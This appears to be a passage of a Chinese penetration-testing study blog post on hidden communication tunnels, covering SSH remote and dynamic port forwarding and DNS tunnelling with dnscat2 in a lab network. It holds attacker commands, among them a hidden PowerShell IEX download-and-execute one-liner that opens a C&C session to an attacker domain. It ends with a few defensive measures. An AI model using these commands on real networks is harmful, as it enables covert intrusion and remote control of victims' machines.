+<h3 id="2-远程转发"><a href="#2-远程转发" class="headerlink" title="2.远程转发"></a>2.远程转发</h3><p>测试环境：攻击者VPS（172.16.56.1）和一个小型内网（两台机子），攻击者无法访问内网任何一台机器（假如防火墙），内网的一台Linux主机（172.16.55.128）可以访问VPS，另一台windows 2008（172.16.55.139）就不行。</p>
+<p>测试目标：通过目标linux服务器为跳板，将攻击者的VPS的6666端口的流量转发给windows 2008的3389端口。</p>
+<p>在目标linux服务器执行如下命令：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ssh</span> -CfNg -R <span class="hljs-number">6666</span>(VPS端口):<span class="hljs-number">172.16.55.139</span>(目标主机):<span class="hljs-number">3389</span>(目标端口) root@<span class="hljs-number">172.16.56.1</span>(VPS)<br></code></pre></td></tr></table></figure>
+<p><img src="/2021/02/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%8C-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/51.png" srcset="/img/loading.gif"></p>
+<p>现在访问VPS的6666端口即可访问windows 2008的3389端口了</p>
+<p><img src="/2021/02/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%8C-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/52.png" srcset="/img/loading.gif"></p>
+<p><strong>本地转发是将远程主机（服务器）某个端口的数据转发到本地机器的指定端口；远程端口转发则是在远程主机上监听一个端口，所有访问远程服务器指定端口的数据都会通过SSH隧道传输到本地的对应端口。</strong></p>
+<h3 id="3-动态转发"><a href="#3-动态转发" class="headerlink" title="3.动态转发"></a>3.动态转发</h3><p>假设环境：攻击者VPS（deepin）172.16.56.1，还有一个小型内网：两台机器，一台linux <code>172.16.56.129</code>，<code>172.16.55.128</code>，另一台是windows 2008 r2 —-&gt;<code>172.16.55.139</code></p>
+<p>​    在VPS上执行如下命令，建立一个动态的SOCK4/5代理通道，输入web服务器的密码，</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ssh</span> -CfNg -D <span class="hljs-number">7000</span> root@<span class="hljs-number">172.16.56.129</span>(目标linux机器)<br></code></pre></td></tr></table></figure>
+<p>​    接下来，在本地打开浏览器，设置网络代理。然后通过浏览器就可以访问内网的windows 2008的web服务了。当然也可以设置系统代理，访问windows 2008的其他端口和服务。</p>
+<p>​    动态端口映射就是建立一个SSH加密的SOCKS 4/5的代理通道。任何支持SOCKS 4/5的程序都是可以使用这个加密通道进行代理访问。</p>
+<h2 id="2-DNS协议"><a href="#2-DNS协议" class="headerlink" title="2.DNS协议"></a>2.DNS协议</h2><p>​    DNS隧道的工作原理：在进行DNS查询时，如果查询的域名不在DNS服务器本机的缓存中，就会访问互联网进行查询，然后返回结果。如果在互联网上有一台定制的服务器，那么依靠DNS协议即可进行数据包的交换。从DNS协议的角度看，这样的操作只是在一次次地查询某个特定的域名并得到解析结果，但其本质问题是，预期的返回结果应该是一个IP地址，而事实上不是-返回的可以是任意字符串，包括加密的C&amp;C指令。</p>
+<h3 id="1-查看DNS的连通性"><a href="#1-查看DNS的连通性" class="headerlink" title="1.查看DNS的连通性"></a>1.查看DNS的连通性</h3><p>​    首先，需要知道当前服务器是否允许通过内部的DNS解析外部域名，也就是要测试DNS的连通性。</p>
+<p>​    输入如下命令，查询当前内部的域名以及IP地址：</p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">cat <span class="hljs-regexp">/etc/</span>resolv.conf|<span class="hljs-keyword">grep</span> -v <span class="hljs-string">&#x27;#&#x27;</span><br></code></pre></td></tr></table></figure>
+<p>​    输入如下命令，查询是否能够通过内部的DNS服务器解析外部域名。如果可以，则意味着可以使用DNS隧道实现隐蔽通信。</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">nslookup</span> <span class="hljs-selector-tag">baidu</span><span class="hljs-selector-class">.com</span><br></code></pre></td></tr></table></figure>
+<h3 id="2-部署域名解析"><a href="#2-部署域名解析" class="headerlink" title="2.部署域名解析"></a>2.部署域名解析</h3><p>​    在一台外网VPS服务器上安装LINUX操作系统（作为C&amp;C服务器），并需要一个可以配置的域名。</p>
+<p>​    创建一条A记录，将自己的域名解析服务器（ns1.xxxx.com）指向VPS服务器的IP。</p>
+<p>​    创建一条NS纪律，将dnsch子域名的解析结果指向ns1.xxxx.com</p>
+<p><img src="/2021/02/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%8C-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/53.png" srcset="/img/loading.gif"></p>
+<p>​    A类型的解析结果：告诉域名服务器ns1.xxxx.com的ip地址是我们的VPS的ip地址</p>
+<p>​    NS类型的解析结果：告诉域名服务器vps.xxxx.com的地址是ns1.xxxx.com。</p>
+<p>设置后，需要测试一下域名的解析是否设置成功：如果如下命令成功执行，并且现实的IP地址是我们设置的ip地址，说明A类型解析设置成功。</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">ping</span> <span class="hljs-selector-tag">ns1</span><span class="hljs-selector-class">.xxxx</span><span class="hljs-selector-class">.com</span><br></code></pre></td></tr></table></figure>
+<p><img src="/2021/02/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%8C-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/54.png" srcset="/img/loading.gif"></p>
+<p>接下来，在VPS服务器上抓包（端口53的UDP包）</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> tcpdump -n -i eth<span class="hljs-number">0</span> udp dst port <span class="hljs-number">53</span><br></code></pre></td></tr></table></figure>
+<p>并输入如下命令：</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">nslookup</span> <span class="hljs-selector-tag">vps</span><span class="hljs-selector-class">.xxxx</span><span class="hljs-selector-class">.com</span><br></code></pre></td></tr></table></figure>
+<p>此时查看VPS服务器的抓包情况，如果抓到对域名<code>vps.xxxx.com</code>进行DNS查询的请求数据包，说明NS类型解析设置也成功生效：</p>
+<p><img src="/2021/02/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%8C-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/55.png" srcset="/img/loading.gif"></p>
+<h3 id="3-安装dnscat2服务端"><a href="#3-安装dnscat2服务端" class="headerlink" title="3.安装dnscat2服务端"></a>3.安装dnscat2服务端</h3><p>​    在VPS服务器上安装dnscat2服务端。因为服务端是用ruby语言编写的，所以需要配置Ruby环境。我在vps上是使用ubuntu系统，执行如下命令即可安装：</p>
+<p>安装ruby环境</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sudo apt-<span class="hljs-builtin-name">get</span> install gem<br>sudo apt-<span class="hljs-builtin-name">get</span> install ruby-dev<br>sudo apt-<span class="hljs-builtin-name">get</span> install libpq-dev<br>sudo apt-<span class="hljs-builtin-name">get</span> install ruby-bundler<br></code></pre></td></tr></table></figure>
+<p>安装dnscat2服务器端：</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs vim">sudo apt-<span class="hljs-built_in">get</span> install git<br>git clone http<span class="hljs-variable">s:</span>//github.<span class="hljs-keyword">com</span>/iagox86/dnscat2.git<br><span class="hljs-keyword">cd</span> dnscat2/server<br>bundle install<br></code></pre></td></tr></table></figure>
+<p>执行该<code>bundle install</code>命令的时候，可能会报错</p>
+<p><img src="/2021/02/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%8C-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/56.png" srcset="/img/loading.gif"></p>
+<p>我们只要修改Gemfile文件即可。</p>
+<p><img src="/2021/02/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%8C-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/57.png" srcset="/img/loading.gif"></p>
+<p><img src="/2021/02/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%8C-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/58.png" srcset="/img/loading.gif"></p>
+<p>接下来执行如下命令，启动服务端：</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">sudo <span class="hljs-keyword">ruby</span> dnscat2.rb vps.xxxx.<span class="hljs-keyword">com</span> -<span class="hljs-keyword">e</span> <span class="hljs-keyword">open</span> -<span class="hljs-keyword">c</span> password --<span class="hljs-keyword">no</span>-cache<br></code></pre></td></tr></table></figure>
+<p><code>-c</code>：定义了”pre-shared secret”，可以使用具有预共享密钥的身份验证机制来防止中间人攻击。因为<strong>传输的数据的并未加密</strong>，所以可能被监听网络流量的第三方还原。如果不定义该参数，dnscat2会自己定义一个随机的字符串（<strong>客户端需要用到</strong>）。</p>
+<p><code>-e</code>：规定安全级别。”open”表示服务端允许客户端不进行加密。</p>
+<p><code>--no-cache</code>：禁止缓存。务必在允许服务端的时候添加该选项。</p>
+<p>如果采用的是直连模式：</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sudo ruby dnscat2.rb --dns <span class="hljs-attribute">server</span>=127.0.0.1,port=533,type=TXT <span class="hljs-attribute">--secret</span>=password<br></code></pre></td></tr></table></figure>
+<h3 id="4-在目标主机上安装客户端"><a href="#4-在目标主机上安装客户端" class="headerlink" title="4.在目标主机上安装客户端"></a>4.在目标主机上安装客户端</h3><p>​    dnscat2客户端是用c语言编写的。因此在使用之前需要进行编译。在windows中，可以使用VS进行编译；在linux中，直接运行<code>make install </code>命令即可进行编译。</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/iagox86/</span>dnscat2.git<br>cd dnscat2<span class="hljs-regexp">/client/</span><br>make install <br></code></pre></td></tr></table></figure>
+<p>windows目标主机的话，我们可以直接使用编译好的客户端：</p>
+<p><a target="_blank" rel="noopener" href="https://downloads.skullsecurity.org/dnscat2/">https://downloads.skullsecurity.org/dnscat2/</a></p>
+<p>服务端建立后，执行如下命令，测试客户端是否能与服务端通信：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">dnscat2</span>-v<span class="hljs-number">0</span>.<span class="hljs-number">07</span>-client-win<span class="hljs-number">32</span>.exe --ping vps.xxxx.com(你设置的域名解析的)<br></code></pre></td></tr></table></figure>
+<p>执行如下命令，连接客户端：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">dnscat2</span>-v<span class="hljs-number">0</span>.<span class="hljs-number">07</span>-client-win<span class="hljs-number">32</span>.exe --dns domain=vps.xxxx.com --secret password<br></code></pre></td></tr></table></figure>
+<p>如果客户端连接成功，会显示”Session established!”这条信息。</p>
+<p>如果服务端使用的是<strong>直连模式</strong>，可以直接填写服务端的IP地址（不通过DNS服务提供商）向dnscat2服务端所在的IP地址请求DNS解析：</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">dnscat --dns <span class="hljs-attribute">server</span>=&lt;dnscat<span class="hljs-built_in"> server </span>ip&gt;,<span class="hljs-attribute">port</span>=533,type=TXT <span class="hljs-attribute">--secret</span>=password<br></code></pre></td></tr></table></figure>
+<p>​    如果目标机器的powershell 2.0以上的版本的话，推荐使用powershell版本的dnscat2客户端。</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/lukebaggett/</span>dnscat2-powershell.git<br></code></pre></td></tr></table></figure>
+<p>将脚本上传到目标机器后，执行如下命令加载脚本</p>
+<figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq"><span class="hljs-keyword">Import</span>-<span class="hljs-keyword">Module</span> .\dnscat2.ps1<br></code></pre></td></tr></table></figure>
+<p>如果可以连接网络的话，可以执行如下命令</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-constructor">IEX(New-Object System.Net.Webclient)</span>.<span class="hljs-constructor">DownloadString(&#x27;<span class="hljs-params">https</span>:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-params">raw</span>.<span class="hljs-params">githubusercontent</span>.<span class="hljs-params">com</span><span class="hljs-operator">/</span><span class="hljs-params">lukebaggett</span><span class="hljs-operator">/</span><span class="hljs-params">dnscat2</span>-<span class="hljs-params">powershell</span><span class="hljs-operator">/</span><span class="hljs-params">master</span><span class="hljs-operator">/</span><span class="hljs-params">dnscat2</span>.<span class="hljs-params">ps</span>&#x27;)</span><br></code></pre></td></tr></table></figure>
+<p>加载脚本后，执行如下命令开启dnscat2-powershell服务：</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">start-Dnscat2</span> <span class="hljs-selector-tag">-Domain</span> <span class="hljs-selector-tag">vps</span><span class="hljs-selector-class">.xxxx</span><span class="hljs-selector-class">.com</span> <span class="hljs-selector-tag">-DNSServer</span> <span class="hljs-selector-tag">ip</span>地址<br></code></pre></td></tr></table></figure>
+<p>也可以用IEX加载脚本的方式，在内存中打开dnscat2客户端：</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">powershell.exe -nop -w hidden -c &#123;<span class="hljs-constructor">IEX(New-Object System.Net.Webclient)</span>.<span class="hljs-constructor">DownloadString(&#x27;<span class="hljs-params">https</span>:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-params">raw</span>.<span class="hljs-params">githubusercontent</span>.<span class="hljs-params">com</span><span class="hljs-operator">/</span><span class="hljs-params">lukebaggett</span><span class="hljs-operator">/</span><span class="hljs-params">dnscat2</span>-<span class="hljs-params">powershell</span><span class="hljs-operator">/</span><span class="hljs-params">master</span><span class="hljs-operator">/</span><span class="hljs-params">dnscat2</span>.<span class="hljs-params">ps</span>&#x27;)</span>;start-Dnscat2 -Domain vps.xxxx.com -DNSServer ip地址&#125;<br></code></pre></td></tr></table></figure>
+<p>连接后，就可以直接建立Powershell会话。执行如下命令，创建一个控制台，然后就可以执行powershell命令和脚本了：</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">exec</span> psh<br></code></pre></td></tr></table></figure>
+<h3 id="5-防御dns隧道攻击的方法"><a href="#5-防御dns隧道攻击的方法" class="headerlink" title="5.防御dns隧道攻击的方法"></a>5.防御dns隧道攻击的方法</h3><p>1.禁止网络中的任何人向外部服务器发送dns请求，只允许与受信任的DNS服务器通信。</p>
+<p>2.将邮件服务器/网关列入白名单，并阻止传入和传出流量中的TXT请求。</p>
+<p>3.跟踪用户的DNS查询次数。如果达到阀值，就生成相应的报告。</p>
+<p>4.阻止ICMP。</p>
+<h1 id="6-杂谈"><a href="#6-杂谈" class="headerlink" title="6.杂谈"></a>6.杂谈</h1><p>隐藏通信隧道并没有这样少，以后用到新的技术再进行补充。</p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/">内网安全</a>
+                    
+                  </div>
+                
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/02/19/%E5%AE%9E%E6%88%98-%E5%9B%A0%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E5%AF%BC%E8%87%B4%E7%9A%84getshell/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">实战-因信息泄漏导致的getshell</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/02/02/%E9%92%88%E5%AF%B9%E6%9F%90%E5%95%86%E5%9F%8E%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/">
+                        <span class="hidden-mobile">针对某商城的漏洞挖掘</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments">
+                
+                
+  <div id="vcomments"></div>
+  <script type="text/javascript">
+    Fluid.utils.waitElementVisible('vcomments', function() {
+      Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', function () {
+        new Valine({
+          el: "#vcomments",
+          app_id: "r1aoO2CU8pztHBXDkQYFikuI-gzGzoHsz",
+          app_key: "dJhm8HsnHbHaA1BVeojBc6MI",
+          placeholder: "Just go go",
+          path: window.location.pathname,
+          avatar: "mm",
+          meta: ["nick","mail","link"],
+          pageSize: "10",
+          lang: "zh-CN",
+          highlight: false,
+          recordIP: false,
+          serverURLs: "",
+        });
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the
+    <a target="_blank" href="https://valine.js.org" rel="nofollow noopener noopener">comments powered by Valine.</a>
+  </noscript>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
